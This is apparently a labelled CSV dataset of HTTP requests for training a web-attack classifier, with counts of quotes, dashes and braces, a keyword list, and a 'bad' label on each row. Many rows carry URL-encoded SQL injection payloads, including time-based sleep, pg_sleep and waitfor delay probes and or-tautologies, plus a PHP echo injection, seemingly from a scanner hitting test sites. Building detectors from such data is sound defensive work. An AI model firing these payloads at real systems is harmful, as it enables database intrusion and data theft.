method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php?pp=12,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/cart.php,addcart=4&price=-1%27%20or%20%2770%27%3d%270,4,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-3.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=fwfvqiwg&subject=1&submit=Submit,0,1,1,2,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20-2/,,2,1,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/rate.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/statua/functions/js/shortcode-generator/preview-shortcode-external.php?shortcode=%5Btwitter_follow%20username=%22acunetix%22%5D,,0,2,0,0,1,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%2540email.tst%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,0,1,2,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp?query=1%20and%20sleep%284%29%20,,0,0,0,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-2.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=,comment=1&name=%3cyour%20name%20here%3e%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&phpaction=echo $_POST[comment];&Submit=Submit,3,0,1,0,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%22%20or%20%22107%22%3d%22107&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,4,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp?query=1,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/vuln.php?id=1%3bselect%20pg_sleep%284%29%3b%20--%20,,0,0,1,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=-1%22%20or%2066-64%20%3d%20%222&uuname=wtnckitw,0,2,0,0,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/doLogin,btnSubmit=Login&passw=acUn3t1x&uid=1%3bselect%20pg_sleep%284%29%3b%20--%20,0,0,1,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?aid=1&pid=5,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/guestbook.php,name=anonymous%20user&submit=add%2520message%27%3dsleep%284%29%3d%27&text=1,2,0,0,1,1,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/survey_questions.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php?aaaa/=1&p=-1%27%20or%2070-68%20%3d%20%272,,2,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-2.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/search.php?test=query,goButton=go&searchFor=-1%27%20or%2094-92%20%3d%20%272,2,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=,comment=1&name=<your name here>&phpaction=echo%20%24_POST%5bcomment%5d%3b&Submit=Submit,0,0,0,0,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/vuln.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/guestbook.php,name=1,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/crossdomain.xml,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?pid=7,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php,comment=1&name=%3cyour%20name%20here%3e&phpaction=-1%20or%2060%3d60&Submit=Submit,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/high_yield_investments.htm,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,0,1,2,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/vuln.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-3.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/cart.php,addcart=4&price=1000%22%3dsleep%284%29%3d%22,0,2,0,1,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/oqey-headers,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php?p=-1%22%20or%20%2223%22%3d%2223&pp=12,,0,4,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doSubscribe,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=fwfvqiwg%27%3bselect%20pg_sleep%284%29%3b%20--%20&subject=1&submit=Submit,1,0,1,1,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/index.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/calotropis,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendFeedback,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/simple-post-thumbnails,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup%22%3dsleep%284%29%3d%22&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,2,0,1,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/shaan,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp?query=-1%27%20or%20%2756%27%3d%2756,,4,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/buy.php?id=-1%20or%2078%20%3d%2076,,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
